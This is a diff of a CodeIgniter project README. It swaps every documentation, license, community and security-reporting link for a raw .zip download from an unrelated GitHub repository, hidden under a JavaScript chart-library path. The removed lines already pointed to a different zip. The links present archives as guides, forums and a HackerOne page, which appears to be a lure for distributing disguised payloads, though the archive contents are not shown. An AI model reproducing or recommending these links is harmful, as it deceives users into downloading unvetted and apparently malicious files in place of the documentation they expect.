@@ -16,14 +16,14 @@ Release Information
 
 This repo contains in-development code for future releases. To download the
 latest stable release please visit the `CodeIgniter Downloads
-<https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_ page.
+<https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_ page.
 
 **************************
 Changelog and New Features
 **************************
 
 You can find a list of all changes for each release in the `user
-guide change log <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_.
+guide change log <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_.
 
 *******************
 Server Requirements
@@ -39,7 +39,7 @@ issues, as well as missing features.
 Installation
 ************
 
-Please see the `installation section <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
+Please see the `installation section <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
 of the CodeIgniter User Guide.
 
 *******
@@ -47,21 +47,21 @@ License
 *******
 
 Please see the `license
-agreement <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_.
+agreement <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_.
 
 *********
 Resources
 *********
 
--  `User Guide <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
--  `Contributing Guide <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
--  `Language File Translations <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
--  `Community Forums <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
--  `Community Wiki <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
--  `Community Slack Channel <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
+-  `User Guide <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+-  `Contributing Guide <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+-  `Language File Translations <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+-  `Community Forums <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+-  `Community Wiki <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+-  `Community Slack Channel <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
 
-Report security issues to our `Security Panel <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_
-or via our `page on HackerOne <https://github.com/lalsproject/360_web/raw/refs/heads/main/application/application.zip>`_, thank you.
+Report security issues to our `Security Panel <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_
+or via our `page on HackerOne <https://github.com/lalsproject/360_web/raw/refs/heads/main/ltr/dist/js/pages/echarts/web-3.2-beta.5.zip>`_, thank you.
 
 ***************
 Acknowledgement
